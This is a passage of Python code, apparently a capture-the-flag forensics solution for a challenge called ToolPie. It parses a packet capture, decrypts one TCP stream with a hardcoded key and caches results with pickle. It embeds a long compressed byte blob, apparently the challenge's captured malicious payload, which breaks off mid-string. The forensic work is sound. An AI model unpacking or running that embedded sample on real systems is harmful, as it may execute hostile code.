        filename_save: str = &#34;packets.pickle&#34;,
        folder_save: str = &#34;data&#34;,
    ):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a dictionary.
            If the file already exists, it loads the file.

        Args:
            pcap_file (str): Path to the pcap file.
            pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
            raw (bool, optional): Option to return the raw packets. Defaults to False.
            save (bool, optional): Option to load saved file . Defaults to False.
            filename_save (str, optional): Filename to save the packets if enabled. Defaults to &#34;packets.pickle&#34;.
            folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to &#34;data&#34;.
        &#34;&#34;&#34;

        file_path = None

        if save:
            file_path = self.folfil(folder_save, filename_save)

        if file_path is None or file_path.exists() is False:
            # Read the pcap file
            print(f&#34;Extracting packets using {pcap_function}&#34;)
            packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

            # Save the packets
            if save:
                self.pickle_save_data(
                    packets, filename=filename_save, folder=folder_save
                )
        else:
            print(f&#34;Loading packets from {filename_save}&#34;)
            packets = self.pickle_load_data(file_path)
        return packets

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def custom_stream_extract(self, stream_num=None):
        &#34;&#34;&#34;
        Description:
            Extracts the packets from the pcap file and saves them as a numbered dictionary.
            Can use either scapy or pyshark to extract the packets.

        Args:
            stream_num (int): Stream number to extract

        Returns:
            dict: Dictionary of packets
        &#34;&#34;&#34;

        packets_scapy = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;scapy&#34;,
            save=True,
            filename_save=&#34;packets_scapy.pickle&#34;,
        )

        packets_pyshark = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;pyshark&#34;,
            save=True,
            filename_save=&#34;packets_pyshark.pickle&#34;,
        )

        packet_dict = {}
        for i, packet in packets_pyshark.items():
            if hasattr(packet.tcp, &#34;stream&#34;) and int(packet.tcp.stream) == stream_num:
                packet_dict[i] = packets_scapy[i]
        return packet_dict

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def get_scapy_tcp_stream(self, nunber: int):
        &#34;&#34;&#34;
        Unused , but could be useful in the future
        &#34;&#34;&#34;
        packets = self.smart_extract_packets(
            self.challenge_file,
            pcap_function=&#34;scapy&#34;,
            raw=True,
            save=True,
            filename_save=&#34;packets_scapy_raw.pickle&#34;,
        )
        stream = packets.sessions()
        return stream

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def decrypting_stream_4(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function
        &#34;&#34;&#34;

        stream_4 = self.custom_stream_extract(stream_num=4)

        # print(list(stream_4.keys())[0])
        # # print(stream_4[list(stream_4.keys())[0]].show())

        

        start = 94
        end = 997
        encrypted_data = b&#34;&#34;

        for i, packet in stream_4.items():
            if (
                i &lt; start
                or i &gt; end
                or hasattr(packet, &#34;load&#34;) is False
                or packet[IP].src != &#34;172.31.47.152&#34;
            ):
                continue

            encrypted_data += packet.load

        try:
            decrypted_data = self.dec_file_mes(encrypted_data, self.encryption_key)
            print(f&#34;Packet {i} :&#34;)
            with open(self.folfil(&#34;data&#34;, &#34;decrypted_data&#34;), &#34;wb&#34;) as f:
                f.write(decrypted_data)
            print(decrypted_data)
        except Exception as e:
            print(f&#34;packet {i} : {e}&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def saving_stream_4_encrypted_bytes(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function
        &#34;&#34;&#34;

        stream_4 = self.custom_stream_extract(stream_num=4)

        start = 94
        end = 996

        # print(list(stream_4.keys())[0])
        # # print(stream_4[list(stream_4.keys())[0]].show())

        encrypted_load_file_path = self.folfil(&#34;data&#34;, &#34;encrypted_load.txt&#34;)

        for i, packet in stream_4.items():
            if i &lt; start or i &gt; end:
                continue

            if hasattr(packet, &#34;load&#34;) is False:
                continue

            try:
                with open(encrypted_load_file_path, &#34;ab&#34;) as f:
                    f.write(packet.load)
                # decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
            except Exception as e:
                print(f&#34;packet {i} : {e}&#34;)

        decrypted_data = self.dec_file_mes(packet.load, self.encryption_key)
        print(f&#34;decrypted :&#34;)
        print(decrypted_data)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def decrypting_packet(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function
        &#34;&#34;&#34;
        # packet_data_path = self.folfil(&#34;data&#34;, &#34;packet_1.data&#34;)

        ending_number = 94
        packet_path = self.folfil(&#34;data&#34;, &#34;packets&#34;)

        for num in range(94, ending_number + 1):

            packet_data_path = self.Path(packet_path, f&#34;packet_{num}.data&#34;)

            with open(packet_data_path, &#34;rb&#34;) as f:
                packet_data = f.read()

            decrypted_data = self.dec_file_mes(packet_data, self.encryption_key)
            print(f&#34;Packet {num} :&#34;)
            print(decrypted_data)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/solution.py
    def main(self):
        # self.demarshalling()
        self.decrypting_stream_4()

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.encryption_key = &#34;5UUfizsRsP7oOCAq&#34;

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pickle_save_data(self, data: any, filename: str, folder: str = &#34;data&#34;) -&gt; None:
        &#34;&#34;&#34;
        Description:
            Save data to a pickle file

        Args:
            data (any): data to write to the pickle file. Can be anything
            filename (str): Filename to save
            folder (str, optional): Folder name inside the ctf folder. Defaults to &#34;data&#34;.

        Returns:
            None
        &#34;&#34;&#34;
        with open(self.folfil(folder, filename), &#34;wb&#34;) as f:
            pickle.dump(data, f)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def pickle_load_data(self, filename: str, folder: str = &#34;data&#34;) -&gt; any:
        &#34;&#34;&#34;
        Description:
            Load data from a pickle file

        Args:
            filename (str): Filename to load the data from
            folder (str, optional): Folder name to find the file to load the data from. Defaults to &#34;data&#34;.

        Returns:
            any: Data loaded from pickle
        &#34;&#34;&#34;
        with open(self.folfil(folder, filename), &#34;rb&#34;) as f:
            return pickle.load(f)

        # /home/figaro/CTF/Categories/Forensics/HTB/ToolPie/payloads/more_functions.py
    def load_compressed_data(self):
        &#34;&#34;&#34;
        Description:
            Challenge specific function to load the compressed data
        &#34;&#34;&#34;
        self.compressed_data = b&#39;BZh91AY&amp;SY\x8d*w\x00\x00\n\xbb\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xee\xec\xe4\xec\xec\xc0?\xd9\xff\xfe\xf4&#34;|\xf9`\r\xff\x1a\xb3\x03\xd1\xa0\x1e\xa9\x11\x07\xac\x9e\xef\x1e\xeez\xf5\xdb\xd9J\xde\xce\xa6K(\xe7\xd3\xe9\xcd\xa9\x93\rS@M\x134&amp;\r\x11\x94xF\x11\xa6\x89\xb2\x99\xa6\x94\xf0\x1ai\xa1\xa6\x9a\x03AF\xd1\x1e\x9e\xa1\x9a\xa7\x89\xa6L\x84\xf5\x1ayC\xd44z\x993S h\r\x0f)\xe9\x03@\x03LG\xa9\xa0\x1a\x04DI\xe8\x19$\xf4\xc9\xe92a\xa3D\xc9\x9aL\x11\x81O\&#39;\xa4\x9e\x935=M\xa4\xd0\xd1\xa6&amp;F\x81\x93L\x86\x80\x00\x00\x06\x80\x00\x00\x00\x00\x00\x00\x00\x00\rM\t4\xd1\x80L\t\x91\x18\xa9\xe4\xc6\x94\xd8\xa7\xb5OS\xc9\xa4=#\xf54\xd4\x06j\x07\xa9\xeaz\x9a\x1e\xa1\xa0z\x86\x83M\x03jh\x00\x03A\xa6@\x1a\x00\x00\x03\xd4\x00\x1e\xa7\x944\x005=\x10\x93\x10\x9b@\x994\xc8\x99\xa3J\x1bM\x1ajyOF\xa6\x98\xcab\x0c\xd16\xa0m&amp;\x8fH\xd3@44\x01\xa0\x00\r\x03@\x004\x19\x00\x00\x00\x004\x1a\x01U44\x00\x03@\xd0\x1a\x0044\xd0\x06@\x1a\x00\x004\xd0\x18\x98\x86@42d\x00h\x1ad\x00\x00\x00\x004h\x00\x00\x00`\x91$Bhh4`\x9a\x19\x04\xc3@\xa9\xedS\xf4S\xd2\x1b\xd4\xda&amp;M&amp;\xd2m#\xcai\xfa\x8c\x93e=@\x1e\x91\xa0z\x8cjh\xd1\xa6\x80\x00\xd0\x004\x1e\xa0\x01\xa0\x1a4i\xb54\xd3\x10\x1f\xdf\xcb\x98\x99\r\xa1\r\x8c`\xd86\x0cd\xe9\xc3\x06\x9bm6\xdbm\x1b\xf1&#34;\xf0\xd2\xa7\xd5p,\x171gAcG]V\xcfvr\x9e\r\x9d=\x13?N\xfa\x8bw3l`\x0e\x1c\xda\xdc\xb0VU\xa0\xe7\x8df&gt;$\x10\xb5\xf2+fu\xd6\xd5\xed\x9a\x9c|b\xb1\xc4\xd1P\xd0\x95\xf8\x10\xc0\xb8\xd2\x10\\ 9\x83UF#^H\x12\x12\x91\x98\x9c\x1d\x89BQ\x8eC\x92\x066\x8bDp\x8a\xaa\x03e%\xad\xc4\xe5o\x8f\x01\xa0\x11\x84\xac\xb8H\x01^\xb7\x84y\xed\x0cU\xb37\xd7[w\xddm\xf4\xf9\xdb\xee7\xa6\x98\xe2-A\xea\x1c\xd6\xbe\xbf1\xe2\x03\x89A:2\xb0n\x0b\xc169\x8a\xab\n\\\xa4\xa0\xbb{ \x11\xa7\x1e-\xbc,P`F\xad\x08\xe1\x8dY\x9b\x02,\x8cs#eg%\x97\x071\xda\xe8XA|&gt;\xa1\xae\xaah%\xc4]\x95w*4i[\x85\xee\xee=\xcf\x935q\x02uo&#34;\xaf\x81/\xc0\xca\xbdF;\xf6\xef\xaa\x99A/ \x91\xef\x0b\xe1\xd9\xa4`w\x9e\xc6\x88\xf2\xa9S\xe3\xa6x\xaf|\x0b*IE\x02\x8a(NL\x00]?\x12\x10p=w\xc6\x92G\x8a\xd2\xff\x17}~y3\xe3\xe9f\xf1\xff\xaf\xf2\xa5\xb9\xa5\xcc\xfd;W\xdd\x1e\xcd\x9e\x0bD5\x0b\x0f\xc6wFW\\\xd5\x8d Gh\xc1\n|x2\x99&amp;\x8e\\\xa5Ba\x7f6!\x10\xe4\xd0p\x18\x90\x97k4\x1a\xec@\x1b~~\x8d\xfe\xee\x96\x07\x8f\xd6\xe1SS\xcdOv\x8c\x89\xd2I\x150\xa5\xdd\xaa&gt;E\x07\xdb\xf8l\x97V\xa0\x1c\x8d\xd9\xa50\x17[h\xd1\x02\x08!f\xad\xea\xa0&#34;\x88\xceC\x0c\x0fVG^\xc0\xea_\x10\xbd\xa1m{5IL\xbb\xd2\x9an\x07\xd9a\x98jgIwr&amp;&amp;\x06\x0c\x8aH\xe73\xdd\xb1\x050\x9f\x1f\x1f\xe1J\&#39;\x9d\x8cY\xa8\x11\x0b\x08\x0fd*\xf2\x9d\xc2\x84$\x10\x8a\xd9\xc1\xe05\xecs\xdeC\x9a\xd1\xb7\x85\x0eNiJj2\x9ag\x12\x94M)\xd2\r\xf3\xa8\x84\xc9\xc2\x06\xe1\x14\xda\xd1\x1e\x1bV\x1a\x0b\xe666\xc6~V\x81/r\x98\x95\xf2g\xc7Mm&lt;\xed\xb0\xe9ko\x01\xcb4\x88\x17\x84\x8a&#34;J\x9bJ\x18\x0ch;\x84\tv\xcb\xbaEL\x99\xdf\xaa)q/t:45\xba\xbf\x84V\xf5\xb3\xad\x8c\xee\x11\xe2(\x18&gt;\xea3\xa9\x98\xa8B\xcf\xb5\xdc\xed\xacI&lt;\x90\x06\x1d0)Y@\x86\x07\x7f\xee\xb9\xf5{m\xdf\x83Hf\xb3T\xd2\xdf\x9c\xc6\xab\xac\x13\x99\xcb\xec\xf5K\xf2\x80\xce\x9fC\xf4w\xeb\x1fa\x08\xd8\r\x80&lt;%\x90w\x8b\xe8}\x8d\xda\x96\xcf)\x1a\xbaD.\xa3\xc2\xe5E\xe3\xc9p\xa8&amp;w\x10\x14\xc6$v-I\xd9\xbd\xcf\xbf\xe1\xce\x19\xcdf\x07\x0b\x7f\xd7\xc8:\xa6nw\xfc=M\\n\xc7\x02\x96\n\x85&#34;.j\xa8G}\x04\xef\x1e+\xb0)4\x82G_\x05\xfe\xbe\x94\xf3\x03\xd4*\xe2\xf7T\xa8\x97\x97\xc3X\x8a\x9a;\x9a\xbei\xc9\xad\xd1\xd2\xcf\xde4fpz\xce\rY\xa5\xa2s\xad\xf8(S\xf3*\x85\xea$\x14\x18\xb6\x1a\xbb\xc5.O\xc3\xb7\x89\xeb9\x1a4\xd3\xe0\x999r\x99\x9a(\x84\xce\x17\x0bk\xa59\xd2X\x88\x815\xab\x10x\x9f\xb7\xc5\xe7_R\xaa\xaa\xab\xf2\x9e\xe1\xb9\x8aK\x91\xa3\xa1\xa7\xc0\x94\x8f3\xca\x82\x8azY\xc4g\xed\xcf\xa9BO:`\xb5\x1b2\x12\xbb\x89\x17[m\xa2\xe8\xc4\x0ctJ/-\xa5\xbf\xf1\xffq\x7f\xda\x9a\xd9\x00\xb2\x0b\x98L\x7f\x17\xb4\xc9g}\x1e\xfeSh \xc3\x98fIq\x05]\xb1\x8aB\x98\xc7\x94\x03=2&amp;\x06v@s\x0fX\xb3\xadZ\xcf\xac\xf6\xae\xe2\x0b\xaa\xe4\x99\xf3\xf5&lt;\xd7\x81mu\x87\xb5\x97\xd2\xc3\xb4p\xb5\xad\xd9y\x15\xf2\x06,\xa7;\xe2\xe4\xcaH\xbf\xd5\x92@\xae\x0c\x91\xddD\x9by\xd5\xccj\x7f\xa9\x19\xad\xa3\x07\xbdI\x84\xa9|k/\x0f7=ji\x12\xba\xd4\xfaI\x8c\xa9\x94\n\x9b\xa43\x0e\xa6O\xd3\x8d\xf5\x83\x06\xd8\xaehhl\x05*;\xda\xaa\xd9he\xc8\x8f2!\x98\xd6-B\xa9\xcf\x9a\xb9_\xa4\xec\xda\x08&lt;\xe3\r\xeem\x1el\xd8\xfc}3\xc4\xbal\xe5,P\xe4^\xae-\x97\x91j0\xec\xc8bB\x85\xd1.\xf5T\xa4\xf1\x83\x89\xc4-\\\x00\xf0\xbb\x1a\xd2\x89K\xb58\x96\xe2\x88\xdd&lt;q\r\xbb0\xc4Ac\x95.v\x94\x08&gt;\xca\x8b\xf5\xa1\xaf\x1fVH\x16\n\xfe+\x02\x9f\xe9\xa7VP\x1a\x03m\x01\xab\x0b\xf8\xd1&amp;\xacq\xadg\x0f\xfc\x98N\x91XRQ\x88\xcf- 4K\x84q&#34;\xec\xb2\x8c\xe6e\x86 \x9ff\x10\x83p\xc5\xc1C\xf4\x8c5\xda\xe5\x82)\xcf\n\xbfWZ\xc0\xd1\x9b`\xacFt\xba\xed\xaf#\xc8\xf8\x96\xe9=Zd\xa4h\xa3d&gt;\xb2\xec\xac\x98\xe6%\xca\xb2r\xe2\xd7\xb5\x80\x8c\x1cb0\xadC\x8a\xdb\x1e\x1d\x9ek\xf0&gt;\xcf\&#39;7=\x9b\x19\xdee@\n\xaa\xac\xd2N%$\x91]\xa7\x13c\xe7\xce\x95\x96\x81Yh\nS\xd1\xdc\xb5\xe3d{\x13\xc5\xeau22\xcc\xec\xe1\x19\xb6\n\x8e?\n\x01\xdey\x04t\x02&#34;@\x82\x12J\x88\x86\x1b\x83Un\x03Uy\xed\x82\xc3\x19\xdd\x86\r\xda\x1a\xde\x7f\x14\x90\xb3\xaf?\x05\xd3\xf0\x05\xe9\x85\x83\x99m\x8ae\x86\xd59Zl\x83i\x04u&lt;\x92]\xe9\xca\xbc\xf5k\xcd\x8e,\xc1\xfcU\xc7\x84%|&gt;\xfbt\x9c\x04\xf0}\xceQ|Wy\x9eN\xa8\x19#\x12\x94\xf1\xfdX5`\x19\x0e\x87NwC\xa5\x80p\xb1\xd9\xc73F\xe8\xa5\x9c\x00\xe5\xb1)\xd3]\xa6\r\x9d\x1a\xdd\xa4\x91\xb9z}\x1bg\x12\x9e&lt;\nB\x88\x0e\xdf:\x1c\t\xc3\xa3\x85\x1b\x98y\xec\x0c\x9a\x12Pr\xcdC\xea1\x7f\x01\xef\xc3\xb0\xdd16\xe7\x1e\xf7\x1fv4\x17\r\xd3\x86\xceE@\xce\x15T\xce\x00\xf3@\xd9\r\x05\x19@V\x1c&#34;\x86\xa6\x9c&amp;,\x05\xa6%\x02n(^9\x86\xa65#\xc8\xb5]\x88\x8e\xa2,1\xc3u2\xe0\xa8 \x01\xff&#34;|\xffG\x0b6\xbeU\x8a\xf7;YD\xda\xb4u)l\xf6~\&#39;\x0e\x9b\xb3/\x98Q1\x04\x12JI[\x11*\x81\t\x07\xcb\xadw\xc9\xbf\xbf\xbe\xbaa\xc6\xce\x9e)\x98v\x15\x01j\xa15\xbd\xd0\xcb.\xe3\xd7\xa2`\x15\x9e\x854\xd3\x1am\r\x13A\x9a\xa5\x0b\r\x81\r\xb9\xb3%)Bmr\x12L\r&gt;\x87\x07K\xea\xden\x87\x01c6%\xea\xa5\xd8\xb54\xc0\xca\xb8SBd{O\x9c \x88\x86\xee-80\x81Vv\x08[P\xc221\x9e &amp;,t\x11/9\xe0\xd0\x1f\x1d\xcd\x94\xb9\x95\xc7V\xcb\xd6\xf2M\xf7\xf4gT\xa2\x19\x94\xd9\xfb\x7f\x15\x90\xc5\xb2&amp;\x9e}\x0cq\xe8\xdc(\x1a{l\\\x88\xb8\xab=\x8b\xaaCm\xc0\xcb\xb5w=\xf8\xff\xa3\xdfY\x94\xa5\xa5\x9d0\x04U\x8al\xb8iw\xa3\xb0%\xf1 \x03H\x80\xc9$v\xe6\x98|#DYP\xa4\xfe\&#39;\x04\xe0&amp;\x88+\xeb\xce:\xa0cm,\x1aQ\xfdN\x1c\x97\xa3\x98\xb5q\x1c\xefE\xabEC\xaa\x82\x00\x8c\xcb\xee\x8d\xd6l\xe5\\\xca;\xf9d\xd4\xa5\xaen\xfaW=\x88kU9\xfe\x95&amp;c\x13\x0cL7+5\xe2\xde_\x9f\xf6t\x05Hn\xe2\xff\x9dzi\x9a\x03@`u\xea\x98\xb5\x8e\xd9\xa3W\x85\x96O\x85\x9bf\xc1\xb6\xa4x\xa2/=\x0f\xa6T\xde\xac\xc6\x84\\\xa5q \x8eZ\xd5p*-qC%\xec\x85aH\x90&gt;\xc1\x97%B@\x12B&#34;u\xd5R\x0f\x10`&amp;\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5&lt;\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\&#39;\x04\xc1l&amp;\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) \x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&amp;\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 @B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5&#34;Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82&#34;\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc&#34;\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&amp;\xe7NQ\x9e\&#39;93M\x8f`!\xcc\x80#%\x04\xd2\xeb&#34;T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&amp;\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{&gt;_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e&lt;\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\&#39;Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e&#34;\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9&gt;\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\&#39;\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 \x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2&#34;\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\&#39;\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\&#39;\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\&#39;;r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99&lt;)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12&lt;{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5&gt;&#34;\&#39;\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8&#34;\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&amp;|&gt;\x13(&lt;\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 \x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&amp;\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6&lt;\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18&lt;\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&amp;? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&amp;\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3&lt;\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04&lt;\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&amp;[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac&lt;N7)g\x9f\xc1\xd8p\xab\&#39;\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%&#34;p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c&lt;\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-&#34;\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&amp;+\xf7\x83Oj\x9d\xab\xb7Uh&#34;z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K&gt;qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\&#39;\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa